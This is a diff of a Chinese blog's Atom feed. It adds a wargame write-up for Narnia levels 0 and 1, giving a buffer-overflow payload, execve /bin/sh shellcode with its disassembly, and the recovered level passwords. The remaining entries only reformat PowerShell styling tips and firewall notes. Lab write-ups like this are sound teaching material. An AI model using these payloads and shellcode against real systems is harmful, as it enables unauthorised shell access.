@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://v1ncigod.github.io</id>
     <title>随想录</title>
-    <updated>2019-09-08T13:00:53.338Z</updated>
+    <updated>2019-09-17T14:53:21.725Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://v1ncigod.github.io"/>
     <link rel="self" href="https://v1ncigod.github.io/atom.xml"/>
@@ -16,7 +16,7 @@
         <link href="https://v1ncigod.github.io/post/cai-bi-ye-yao-wan-yi-chu-zhi-narnia">
         </link>
         <updated>2019-09-08T12:14:39.000Z</updated>
-        <content type="html"><![CDATA[<p>Narnia0
+        <content type="html"><![CDATA[<p>Narnia0<br>
 先贴源码</p>
 <pre><code class="language-c">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
@@ -48,15 +48,63 @@ int main(){
 -r--r----- 1 narnia0 narnia0 1229 Aug 26 22:35 narnia0.c
 </code></pre>
 <p><img src="https://v1ncigod.github.io/post-images/1567945119255.png" alt=""></p>
-<p>​	我们需要先明确这个系统编译器编译出来的程序运行时是选用的小端序还是大端序,小端序和大端序其实有个很简单的记法，当是正常排列顺序的时候就是大端,反向排序的时候就是小端。我们可以通过一个函数大的打印来明确是大端序还是小端序，当然也可以直接去尝试，反正两次肯定有一次是对的。使用is_bigendian()函数（C语言的，只需要printf输出就不贴源码了）结果可知，它是小端的。
+<p>​	我们需要先明确这个系统编译器编译出来的程序运行时是选用的小端序还是大端序,小端序和大端序其实有个很简单的记法，当是正常排列顺序的时候就是大端,反向排序的时候就是小端。我们可以通过一个函数大的打印来明确是大端序还是小端序，当然也可以直接去尝试，反正两次肯定有一次是对的。使用is_bigendian()函数（C语言的，只需要printf输出就不贴源码了）结果可知，它是小端的。<br>
 ​	这道题的解题payload就是</p>
 <pre><code class="language-bash">cat &lt;(python -c'print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;') - | ./narnia0
 </code></pre>
 <p>或者</p>
 <pre><code class="language-bash">(python -c'print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;';echo 'cat /etc/narnia_pass/narnia1')|/narnia/narnia0
 </code></pre>
-<p>​		这两个payload是有区别的，这个题有个特殊的位置，当校验val的值为0xdeadbeef的时候启动/bin/sh的时候其实启动了shell，使用payload2的时候python输出字符串的时候会在最后最后带一个截断符号表示结束（EOF），这个位置就跟PHP5作为后端用%00截断一样，当你溢出完成其实交互shell已经启动了，但是由于EOF的原因就会立马结束，所以payload2在后面使用；表示没有结束。通过；进行断句（C语言啊C语言）执行了我们通关命令。payload1就是用了一种很取巧的方式，利用bash中的重定向技巧，通过&lt; ()- 的方式获取一个交互的shell，这个方法跟反弹shell的一些命令都是利用重定向，在这个payload中，首先执行了python的输出的字符串作为.narnia0一开始的输入，然后hold住这个会话，当你输入任何语句都会被当作输入传输到narnia0执行到system(&quot;/bin/sh&quot;)中（真绕）也就实现了交互型的shell。
-从这个口令我们得到了narnia1账号密码efeidiedae</p>
+<p>​		这两个payload是有区别的，这个题有个特殊的位置，当校验val的值为0xdeadbeef的时候启动/bin/sh的时候其实启动了shell，使用payload2的时候python输出字符串的时候会在最后最后带一个截断符号表示结束（EOF），这个位置就跟PHP5作为后端用%00截断一样，当你溢出完成其实交互shell已经启动了，但是由于EOF的原因就会立马结束，所以payload2在后面使用；表示没有结束。通过；进行断句（C语言啊C语言）执行了我们通关命令。payload1就是用了一种很取巧的方式，利用bash中的重定向技巧，通过&lt; ()- 的方式获取一个交互的shell，这个方法跟反弹shell的一些命令都是利用重定向，在这个payload中，首先执行了python的输出的字符串作为.narnia0一开始的输入，然后hold住这个会话，当你输入任何语句都会被当作输入传输到narnia0执行到system(&quot;/bin/sh&quot;)中（真绕）也就实现了交互型的shell。<br>
+从这个口令我们得到了narnia1账号密码efeidiedae<br>
+第二题 Narnia1<br>
+先看源码</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+int main(){
+    int (*ret)();
+
+    if(getenv(&quot;EGG&quot;)==NULL){
+        printf(&quot;Give me something to execute at the env-variable EGG\n&quot;);
+        exit(1);
+    }
+
+    printf(&quot;Trying to execute EGG!\n&quot;);
+    ret = getenv(&quot;EGG&quot;);
+    ret();
+
+    return 0;
+}
+</code></pre>
+<p>这个题关键的行数在于第4行和第12行,第4行在主函数中初始化了一个指针(内存执行下一个位置的标志),第12行调用getenv函数获取环境变量,所以这个位置传入的值在一开始是一个指针,所以当传入值是一段shellcode的时候就会从ret的执行跳转到shellcode的执行。<br>
+查看权限<br>
+<img src="https://v1ncigod.github.io/post-images/1568729036128.png" alt="1568729036128"><br>
+所以我们需要提供一段shellcode去以Narnia1的权限运行Narnia1通过shellcode获取narnia2的权限。<br>
+在http://shell-storm.org/shellcode/files/shellcode-811.php我们找到了一个合适的shellcode适用于这个机器<br>
+构造payload来获取shell</p>
+<pre><code class="language-bash">export EGG=`python -c'print&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&quot;'`
+</code></pre>
+<p>需要特意说的是因为用了三层，最后一层包裹payload的时候使用“或者‘会导致歧义，所以要使用`（也就是Tab键上面，ESC键下面，俗称tick）进行闭合。<br>
+<img src="https://v1ncigod.github.io/post-images/1568730938895.png" alt="1568730938895"><br>
+这段shellcode的功能是实现了调用了一个bin/bash<br>
+他的汇编是</p>
+<pre><code class="language-ASM">Disassembly of section .text:
+
+08048060 &lt;_start&gt;:
+ 8048060: 31 c0                 xor    %eax,%eax
+ 8048062: 50                    push   %eax
+ 8048063: 68 2f 2f 73 68        push   $0x68732f2f
+ 8048068: 68 2f 62 69 6e        push   $0x6e69622f
+ 804806d: 89 e3                 mov    %esp,%ebx
+ 804806f: 89 c1                 mov    %eax,%ecx
+ 8048071: 89 c2                 mov    %eax,%edx
+ 8048073: b0 0b                 mov    $0xb,%al
+ 8048075: cd 80                 int    $0x80
+ 8048077: 31 c0                 xor    %eax,%eax
+ 8048079: 40                    inc    %eax
+ 804807a: cd 80                 int    $0x80
+</code></pre>
+<p>最后得到的答案是nairiepecu</p>
 ]]></content>
     </entry>
     <entry>
@@ -82,11 +130,11 @@ int main(){
 <p><a href="https://github.com/PowerShell/PowerShell/releases">PowerShell Core 下载</a></p>
 <p><a href="https://blog.walterlv.com/post/beautify-powershell-like-zsh.html">PowerShell美化</a></p>
 <p>完全按照美化教程对待PowerShell Core就ok，字体推荐<strong>DejaVu sans Mono</strong><br>
-WSL 用oh-my-zsh的ys主题
-PowerShell Core 使用 oh-my-posh的Honukai主题就能达成一致
-最后在<strong>Visual Studio Code</strong>里面按照
-<em>首选项-&gt;功能-&gt;终端-&gt;External: Windows Exec</em>
-中设置好pwsh的路径（注意双//转义）就完全ok了。
+WSL 用oh-my-zsh的ys主题<br>
+PowerShell Core 使用 oh-my-posh的Honukai主题就能达成一致<br>
+最后在<strong>Visual Studio Code</strong>里面按照<br>
+<em>首选项-&gt;功能-&gt;终端-&gt;External: Windows Exec</em><br>
+中设置好pwsh的路径（注意双//转义）就完全ok了。<br>
 后面就等着期待了两年的新Shell发布了。</p>
 ]]></content>
     </entry>
@@ -112,8 +160,8 @@ PowerShell Core 使用 oh-my-posh的Honukai主题就能达成一致
 </ul>
 <h2 id="3实现安全策略的控制点">3.实现安全策略的控制点</h2>
 <h3 id="1五元组">①五元组</h3>
-<p>根据OSI模型（开放式系统互联通信参考模型）
-应用层 表示层 会话层←传输层←网络层←数据链路层←物理层
+<p>根据OSI模型（开放式系统互联通信参考模型）<br>
+应用层 表示层 会话层←传输层←网络层←数据链路层←物理层<br>
 <img src="http://ww2.sinaimg.cn/large/8264d223jw1f6pxuxap4mj20s90ag430.jpg" alt="五元组"></p>
 <h2 id="构建了防火墙安全策略的五元组">构建了防火墙安全策略的五元组</h2>
 <table>
@@ -132,7 +180,7 @@ PowerShell Core 使用 oh-my-posh的Honukai主题就能达成一致
 </tbody>
 </table>
 <hr>
-<p>常见格式 R，U，D，dom，F
+<p>常见格式 R，U，D，dom，F<br>
 例 如：192.168.1.1 10000 TCP 121.14.88.76 80</p>
 <h3 id="2访问控制列表aclacess-control-list">②访问控制列表ACL（Acess Control List）</h3>
 <p>访问控制列表是一张为了实现对访问进行控制的包含了匹配关系，条件和查询语句的列表</p>
@@ -160,9 +208,9 @@ PowerShell Core 使用 oh-my-posh的Honukai主题就能达成一致
 <li>log：记录有关数据报进入访问列表的信息。</li>
 </ul>
 <p><strong>ACL规则的匹配原则</strong></p>
-<p><img src="http://ww3.sinaimg.cn/mw690/8264d223jw1f6pydzylurj20jt08ft8y.jpg" alt="访问控制模式">
-1.防火墙安全规则遵循从上到下匹配的原则，一旦有一条匹配，剩下的就不进行匹配
-2.如果所有的规则都没有匹配到，数据包就丢弃
+<p><img src="http://ww3.sinaimg.cn/mw690/8264d223jw1f6pydzylurj20jt08ft8y.jpg" alt="访问控制模式"><br>
+1.防火墙安全规则遵循从上到下匹配的原则，一旦有一条匹配，剩下的就不进行匹配<br>
+2.如果所有的规则都没有匹配到，数据包就丢弃<br>
 3.安全过滤规则主要包含源、目的地址和端口，TCP标志位应用实践以及一些高级过滤选项</p>
 <h2 id="4防火墙的工作方式">4.防火墙的工作方式</h2>
 <h3 id="1包过滤">①包过滤</h3>
@@ -173,17 +221,17 @@ PowerShell Core 使用 oh-my-posh的Honukai主题就能达成一致
 <li>缺点：单包处理，只检查报头，前后数据包没有逻辑关系，不能发现通信插入或缺漏的数据包，也不能发现假冒的数据包，因此很容易被DDOS攻击</li>
 </ul>
 <h3 id="2-状态监测">② 状态监测</h3>
-<p><img src="http://ww1.sinaimg.cn/large/8264d223jw1f6pye4qzt1j20kc0am3yy.jpg" alt="状态监测">
+<p><img src="http://ww1.sinaimg.cn/large/8264d223jw1f6pye4qzt1j20kc0am3yy.jpg" alt="状态监测"><br>
 基于包检测，针对每个用户的访问链接，建立协议运用的状态跟踪（如TCP协议状态）如果不匹配时，则不转发该数据包</p>
 <ul>
-<li>特点：不设置内容缓冲区，不关心传输内容；
-优点：建立连接状态，前后数据包有关联，可以阻止半连接的DDOS攻击；
+<li>特点：不设置内容缓冲区，不关心传输内容；<br>
+优点：建立连接状态，前后数据包有关联，可以阻止半连接的DDOS攻击；<br>
 缺点：对用户连接数量有限制，防火墙的内部缓冲区大小限制跟踪的链接数量</li>
 </ul>
 <h3 id="3应用代理">③应用代理</h3>
-<p><img src="http://ww1.sinaimg.cn/large/8264d223jw1f6pye44tczj20jx0apmxo.jpg" alt="代理模式">
+<p><img src="http://ww1.sinaimg.cn/large/8264d223jw1f6pye44tczj20jx0apmxo.jpg" alt="代理模式"><br>
 防火墙开启若干应用代理，每个代理需要一个不同的应用进程，或一个后台运行的服务程序·，对每个新的 应用必须添加针对此应用的服务程序，否则不能使用该代理的业务无法通过</p>
-<p>特点：
+<p>特点：<br>
 早期防火墙就有的 技术，类似代理服务器，不做五元组检查后期防火墙在特殊场合下使用；</p>
 <ul>
 <li>优点：成为用户与服务器的直接连接，可以避免对服务器的直接入侵；俗称“协议落地”</li>
@@ -215,9 +263,9 @@ PowerShell Core 使用 oh-my-posh的Honukai主题就能达成一致
 <h4 id="1nat技术-网络地址转换-网络地址翻译">①NAT技术： 网络地址转换/ 网络地址翻译</h4>
 <ul>
 <li>1.内网采用私网地址时，访问互联网时需要NAT</li>
-<li>2.隐藏内部网络结构。外网上的入侵者，即使监听到了用户的实际地址，也不能确定的用户的通信，也不能确定用户的实际IP地址，无法确定攻击目标。
-A段 10.0.0.-10.255.255.254
-B段 172.16.0.0.1 - 172.31.255.254
+<li>2.隐藏内部网络结构。外网上的入侵者，即使监听到了用户的实际地址，也不能确定的用户的通信，也不能确定用户的实际IP地址，无法确定攻击目标。<br>
+A段 10.0.0.-10.255.255.254<br>
+B段 172.16.0.0.1 - 172.31.255.254<br>
 C段 192.168.0.1 - 192.168.255.254</li>
 </ul>
 <h4 id="2地址映射map">②地址映射MAP</h4>
@@ -226,40 +274,40 @@ C段 192.168.0.1 - 192.168.255.254</li>
 <p>通过虚拟路由冗余协议完成可替性</p>
 <h3 id="防火墙解决不了的问题">防火墙解决不了的问题</h3>
 <ul>
-<li>防火墙解决了网络层的访问许可，单无法判断内容是否合法
-例：恶意代码可以夹带在电子邮件中
-恶意代码与蠕虫通常隐藏在通信内容中
+<li>防火墙解决了网络层的访问许可，单无法判断内容是否合法<br>
+例：恶意代码可以夹带在电子邮件中<br>
+恶意代码与蠕虫通常隐藏在通信内容中<br>
 防火墙只检测包头，让夹带有攻击或病毒的“合法”内容的数据包通过，基于网络层对数据包的病毒扫描可能察觉不到横跨在多个数据包里的攻击或病毒</li>
 </ul>
 <h3 id="用户需要这样的防火墙">用户需要这样的防火墙</h3>
-<p>在应用层进行病毒恶意代码过滤
+<p>在应用层进行病毒恶意代码过滤<br>
 在网络层进行规则控制</p>
 <h3 id="下一代防火墙ngfw定义">下一代防火墙NGFW定义</h3>
-<p>第一代防火墙对僵尸网络无能为力并且不能有效识别与阻止应用程序的泛滥
-Gartner对NGFW的定义
-1.标准的防火墙功能，如网络地址的转换，状态监测，VPN和大企业需要的功能
-2.入侵防御系统（IPS）和防火墙一体化
-3.应用程序感知能力，自动识别和控制应用程序的
+<p>第一代防火墙对僵尸网络无能为力并且不能有效识别与阻止应用程序的泛滥<br>
+Gartner对NGFW的定义<br>
+1.标准的防火墙功能，如网络地址的转换，状态监测，VPN和大企业需要的功能<br>
+2.入侵防御系统（IPS）和防火墙一体化<br>
+3.应用程序感知能力，自动识别和控制应用程序的<br>
 4.额外的防火墙智能，为辅助决策提供更多信息，如信誉分析，与活动目录（AD）集成，有用的阻塞或漏洞列表</p>
 <h3 id="ngfw新技术的核心">NGFW新技术的核心</h3>
 <p>以以往的五元组变更为以用户身份定义安全策略，识别内容与应用</p>
 <h3 id="utm-统一威胁管理">UTM 统一威胁管理</h3>
-<p>UTM是由传统的防火墙观念进化而成，它将多种安全功能都整合在单一的产品之上，其中包括了网络防火墙，防止网络入侵（IDS），闸道器防毒（gateway antivirus，AV），反垃圾信件闸道器（gateway anti-spam），虚拟私人网络（VPN），内容过滤（content filtering），负载平衡，防止资料外泄，以及on-appliance reporting。
-UTM与NGFW的区别
-1.从功能上看两者差不多；
-2.UTM是IDC在2004年提成，NGFW是Gartner在2009 年提出
-3.UTM强调安全功能的集成，各部分独自处理，主要是解决安全运维管理问题
-4.NGWF强调应用层安全，基于用户配置安全配置策略，各层安全处理高度关联，分层协同处理，提高安全效果；
+<p>UTM是由传统的防火墙观念进化而成，它将多种安全功能都整合在单一的产品之上，其中包括了网络防火墙，防止网络入侵（IDS），闸道器防毒（gateway antivirus，AV），反垃圾信件闸道器（gateway anti-spam），虚拟私人网络（VPN），内容过滤（content filtering），负载平衡，防止资料外泄，以及on-appliance reporting。<br>
+UTM与NGFW的区别<br>
+1.从功能上看两者差不多；<br>
+2.UTM是IDC在2004年提成，NGFW是Gartner在2009 年提出<br>
+3.UTM强调安全功能的集成，各部分独自处理，主要是解决安全运维管理问题<br>
+4.NGWF强调应用层安全，基于用户配置安全配置策略，各层安全处理高度关联，分层协同处理，提高安全效果；<br>
 5.两者的发展都基于传统安全技术积累与硬件处理能力的大幅度增强</p>
 <h3 id="防火墙发展的新趋势-软件化">防火墙发展的新趋势-软件化</h3>
-<p>1.把防火墙功能软件安装在一个通用的服务器里，支持一进一出两个网卡，就可以构成一台防火墙；
-2.把防火墙软件部署在虚拟机里，支持两个虚拟网卡，通过外部 流量引导，把需要处理的的流量从进网卡引入，从出网口引出，就构成一台虚拟防火墙；
+<p>1.把防火墙功能软件安装在一个通用的服务器里，支持一进一出两个网卡，就可以构成一台防火墙；<br>
+2.把防火墙软件部署在虚拟机里，支持两个虚拟网卡，通过外部 流量引导，把需要处理的的流量从进网卡引入，从出网口引出，就构成一台虚拟防火墙；<br>
 3.虚拟防火墙可以部署在虚拟化的 云环境中，可以动态生成，按需分配，按需定义安全策略</p>
 <h3 id="防火墙的未来">防火墙的未来</h3>
-<p>1.防火墙是最早的信息安全产品，是边界安全的第一安全措施最多的安全产品
+<p>1.防火墙是最早的信息安全产品，是边界安全的第一安全措施最多的安全产品<br>
 2.防火墙的发展方向：处理能力高速化，检测能力智能化，部署方式软件化</p>
 <h3 id="参考资料">参考资料：</h3>
-<p>维基百科
+<p>维基百科<br>
 i春秋安全产品原理</p>
 ]]></content>
     </entry>
